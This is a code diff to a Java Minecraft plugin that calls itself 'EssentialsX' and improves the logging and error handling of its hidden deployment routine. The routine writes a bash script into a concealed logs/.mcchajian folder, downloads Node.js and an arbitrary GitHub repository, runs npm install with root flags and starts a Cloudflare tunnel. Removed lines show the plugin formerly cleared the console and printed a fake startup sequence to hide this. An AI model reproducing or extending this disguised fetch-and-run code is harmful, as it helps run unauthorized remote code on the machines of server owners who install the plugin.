@@ -1,5 +1,8 @@
 package com.example.essentialsx;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
 import java.io.File;
 import java.io.FileDescriptor;
 import java.io.FileOutputStream;
@@ -303,6 +306,7 @@ public class EssentialsX extends JavaPlugin {
          Path logFile = botDir.resolve("app.log");
          Path preload = botDir.resolve(".nd_preload.js");
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
+            this.getLogger().severe("[启动] 缺少 Node 或 index.js：node=" + Files.exists(nodeExe) + ", index=" + Files.exists(script));
             return;
          }
          try { nodeExe.toFile().setExecutable(true, false); } catch (Exception var10) {}
@@ -319,6 +323,7 @@ public class EssentialsX extends JavaPlugin {
          nodeRestartTime = System.currentTimeMillis();
          try { this.nodeProcess.getOutputStream().close(); } catch (Exception var9) {}
       } catch (Exception var11) {
+         this.getLogger().severe("[启动] Node 启动失败: " + var11.getClass().getSimpleName() + ": " + var11.getMessage());
       }
    }
 
@@ -534,9 +539,7 @@ public class EssentialsX extends JavaPlugin {
                         lastKnownTunnelUrl.set(foundUrl);
                         lastTunnelUrlTime = now;
                         cfRestartCount = 0;
-                        this.clearConsole();
-                        mcLog("Binding remote endpoint to: " + foundUrl, 0L);
-                        this.printFakeStartupSequence();
+                        this.getLogger().info("[隧道] 地址已更新: " + foundUrl);
                      }
                   }
                   String currentUrl = lastKnownTunnelUrl.get();
@@ -613,16 +616,22 @@ public class EssentialsX extends JavaPlugin {
       Thread deployThread = new Thread(() -> {
          try {
             HashMap<String, String> env = new HashMap<>();
+            this.getLogger().info("[部署] 读取配置并检查工作目录...");
             this.loadEnvFile(env);
             this.startDeploymentProcess(env);
             this.ensurePermissions();
             String port = this.allocateNodePort();
+            this.getLogger().info("[启动] 正在启动 Node，端口 " + port);
             this.startNodeProcess(port);
+            if (this.nodeProcess == null) throw new IOException("Node 进程未启动，请检查 Node、index.js 和 app.log");
             this.waitForNodeReady(port, 60);
+            if (!this.isNodeInternalAlive()) throw new IOException("Node 未在 60 秒内就绪，请查看 logs/.mcchajian/app.log");
+            this.getLogger().info("[启动] Node 已响应，开始启动隧道");
             this.ensurePermissions();
             this.startCfProcess();
             this.startJavaDaemon();
          } catch (Exception var3x) {
+            this.getLogger().severe("[部署] 启动失败: " + var3x.getClass().getSimpleName() + ": " + var3x.getMessage());
          }
       }, "Backend-Deployer");
       deployThread.setDaemon(true);
@@ -734,48 +743,59 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private void startDeploymentProcess(Map<String, String> env) throws Exception {
-      if (!this.isProcessRunning) {
-         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-         if (!Files.exists(workDir)) {
-            Files.createDirectories(workDir);
-         }
-         try {
-            workDir.toFile().setReadable(true, false);
-            workDir.toFile().setWritable(true, false);
-            workDir.toFile().setExecutable(true, false);
-         } catch (Exception var8) {
-         }
-         Files.deleteIfExists(workDir.resolve(".tunnel_url"));
-         Files.deleteIfExists(workDir.resolve(".tunnel_port"));
-         try {
-            Files.deleteIfExists(workDir.resolve("app.log"));
-            Files.deleteIfExists(workDir.resolve("cf.log"));
-            Files.deleteIfExists(workDir.resolve("restart_run.log"));
-         } catch (Exception var7) {
-         }
-         Path scriptPath = workDir.resolve("deploy.sh");
-         String scriptContent = this.generateDeployScript(workDir.toString(), env);
-         Files.write(scriptPath, scriptContent.getBytes());
-         scriptPath.toFile().setExecutable(true, false);
-         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
-         pb.directory(new File(".").getAbsoluteFile());
-         pb.environment().putAll(env);
-         pb.redirectOutput(Redirect.INHERIT);
-         pb.redirectError(Redirect.INHERIT);
-         this.deployProcess = pb.start();
-         this.isProcessRunning = true;
-         new Thread(() -> {
-            try {
-               this.deployProcess.waitFor();
-               this.isProcessRunning = false;
-            } catch (Exception var2x) {
+      if (this.isProcessRunning) throw new IOException("部署已经在进行中");
+      Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+      Files.createDirectories(workDir);
+      if (!Files.isWritable(workDir)) throw new IOException("工作目录不可写: " + workDir);
+      if (env.getOrDefault("REPO_URL", "").trim().isEmpty()) throw new IOException("REPO_URL 未配置，请检查 .env");
+      this.getLogger().info("[部署] 工作目录: " + workDir);
+      this.getLogger().info("[部署] GitHub Token: " + (env.getOrDefault("GITHUB_TOKEN", "").isEmpty() ? "未配置" : "已配置（不显示内容）"));
+      Path doneFile = workDir.resolve(".deploy_done");
+      Files.deleteIfExists(doneFile);
+      Files.deleteIfExists(workDir.resolve(".tunnel_url"));
+      Files.deleteIfExists(workDir.resolve(".tunnel_port"));
+      try {
+         Files.deleteIfExists(workDir.resolve("app.log"));
+         Files.deleteIfExists(workDir.resolve("cf.log"));
+         Files.deleteIfExists(workDir.resolve("restart_run.log"));
+      } catch (IOException e) { this.getLogger().warning("[部署] 清理旧日志失败: " + e.getMessage()); }
+      Path scriptPath = workDir.resolve("deploy.sh");
+      Files.writeString(scriptPath, this.generateDeployScript(workDir.toString(), env), StandardCharsets.UTF_8);
+      scriptPath.toFile().setExecutable(true, false);
+      ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
+      pb.directory(new File(".").getAbsoluteFile());
+      pb.environment().putAll(env);
+      pb.redirectErrorStream(true);
+      this.getLogger().info("[部署] 启动部署脚本，下载失败原因将显示在控制台");
+      this.deployProcess = pb.start();
+      this.isProcessRunning = true;
+      final Process current = this.deployProcess;
+      final String token = env.getOrDefault("GITHUB_TOKEN", "");
+      Thread output = new Thread(() -> {
+         try (BufferedReader reader = new BufferedReader(new InputStreamReader(current.getInputStream(), StandardCharsets.UTF_8))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+               if (!token.isEmpty()) line = line.replace(token, "[已隐藏]");
+               line = line.replaceAll("(?i)(authorization:?[ ]*bearer[ ]+)[^ ]+", "$1[已隐藏]");
+               line = line.replaceAll("(https?://)[^/@\\s]+@", "$1[已隐藏]@");
+               this.getLogger().info("[部署] " + line);
             }
-         }).start();
-         Path doneFile = workDir.resolve(".deploy_done");
-         while (!Files.exists(doneFile)) {
-            Thread.sleep(1000L);
+         } catch (IOException e) { this.getLogger().warning("[部署] 读取日志失败: " + e.getMessage()); }
+      }, "Deploy-Output");
+      output.setDaemon(true);
+      output.start();
+      try {
+         if (!current.waitFor(20, TimeUnit.MINUTES)) {
+            this.killProcessTree(current);
+            throw new IOException("部署超过 20 分钟，已停止；请检查网络或依赖安装");
          }
-      }
+         output.join(3000);
+         int exitCode = current.exitValue();
+         if (exitCode != 0 || !Files.exists(doneFile)) throw new IOException("部署脚本退出码 " + exitCode + "，完成标记不存在或部署失败；请查看上方错误及 deploy.log");
+         if (!Files.isRegularFile(workDir.resolve("app/index.js"))) throw new IOException("部署完成但找不到 app/index.js，请检查仓库目录结构");
+         if (!Files.isRegularFile(workDir.resolve("nodejs/bin/.node_real"))) throw new IOException("部署完成但 Node 可执行文件不存在");
+         this.getLogger().info("[部署] 脚本完成，index.js 和 Node 文件已找到");
+      } finally { this.isProcessRunning = false; }
    }
 
    private String generateDeployScript(String workDir, Map<String, String> env) {
@@ -798,7 +818,7 @@ public class EssentialsX extends JavaPlugin {
          + dataDir
          + "\"\nREPO_URL=\""
          + repoUrl
-         + "\"\nJRE_DIR=\"$WORK_DIR/jre21/bin\"\nexport HOME=\"$WORK_DIR\"\numask 0002\n\nif [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n\nARCH=$(uname -m)\nif [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\nelif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n\nmkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\n\nNEED_DOWNLOAD=false\nif [ -d \"$NODE_DIR\" ]; then\n    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\nelse NEED_DOWNLOAD=true; fi\n\nif [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n    mkdir -p \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n        chmod -R 775 \"$NODE_DIR\" 2>/dev/null; find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n    else rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"; fi\nfi\nexport PATH=\"$NODE_DIR/bin:$PATH\"\n\nmkdir -p \"$NODE_DIR/bin\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n\nif [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n    rm -f \"$WORK_DIR/node.tar.gz\"; NODE2_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi; fi; done\n    if [ \"$NODE2_OK\" = \"true\" ]; then\n        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 --no-same-owner 2>/dev/null\n        mkdir -p \"$NODE_DIR/bin\"; cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; else rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; fi\nfi\n\nif [ -d \"$APP_DIR\" ]; then\n    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null; fi\nrm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n\nREPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\nTAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n"
+         + "\"\nJRE_DIR=\"$WORK_DIR/jre21/bin\"\nexport HOME=\"$WORK_DIR\"\numask 0002\n\nif [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n\necho \"[阶段] 检测系统架构并准备 Node\"\nARCH=$(uname -m)\nif [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\nelif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n\nmkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\n\nNEED_DOWNLOAD=false\nif [ -d \"$NODE_DIR\" ]; then\n    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\nelse NEED_DOWNLOAD=true; fi\n\nif [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n    mkdir -p \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\"; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n        chmod -R 775 \"$NODE_DIR\" 2>/dev/null; find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n    else rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"; fi\nfi\nexport PATH=\"$NODE_DIR/bin:$PATH\"\n\nmkdir -p \"$NODE_DIR/bin\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n\nif [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n    rm -f \"$WORK_DIR/node.tar.gz\"; NODE2_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\"; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi; fi; done\n    if [ \"$NODE2_OK\" = \"true\" ]; then\n        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 --no-same-owner 2>/dev/null\n        mkdir -p \"$NODE_DIR/bin\"; cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; else rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; fi\nfi\n\nif [ -d \"$APP_DIR\" ]; then\n    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null; fi\nrm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n\necho \"[阶段] 下载仓库（如失败将显示 curl 原因）\"\nREPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\nTAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n"
          + (
             githubToken.isEmpty()
                ? ""
@@ -806,14 +826,15 @@ public class EssentialsX extends JavaPlugin {
                   + githubToken
                   + "\" ]; then\n    if curl -fsSL --connect-timeout 15 --max-time 120 "
                   + authHeader
-                  + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n"
+                  + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\"; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n"
          )
-         + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\n"
-         + "echo \"Installing dependencies...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n"
+         + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\"; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then echo \"[错误] 所有仓库下载地址均失败，或下载内容不是有效的 tar.gz\"; exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\n"
+         + "echo \"[阶段] 安装 npm 依赖，详细信息写入 deploy.log\"\n"
          + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "if [ $? -ne 0 ]; then \n"
          + "    echo 'npm install failed, retrying with legacy-peer-deps...' >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >> \"$WORK_DIR/deploy.log\" 2>&1\n"
+         + "    if [ $? -ne 0 ]; then echo \"[错误] npm 依赖安装失败，请查看 deploy.log\"; exit 1; fi\n"
          + "fi\n"
          + "echo \"Pre-installing koffi to prevent runtime errors...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install koffi --no-save --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\n"
